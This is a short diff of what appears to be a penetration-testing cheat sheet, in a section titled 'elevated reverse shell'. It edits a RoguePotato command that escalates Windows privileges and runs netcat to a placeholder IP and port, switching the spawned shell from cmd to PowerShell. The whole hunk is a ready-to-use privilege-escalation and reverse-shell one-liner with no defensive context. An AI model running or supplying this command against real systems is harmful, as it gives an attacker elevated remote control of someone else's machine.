@@ -13,7 +13,7 @@ todo
 ## elevated reverse shell
 https://github.com/antonioCoco/RoguePotato
 ```cmd
-.\RoguePotato.exe -r <ip> -e "<nc_exe_path> <ip> <port> -e cmd" -l 9999
+.\RoguePotato.exe -r <ip> -e "<nc_exe_path> <ip> <port> -e powershell" -l 9999
 ```
 
 
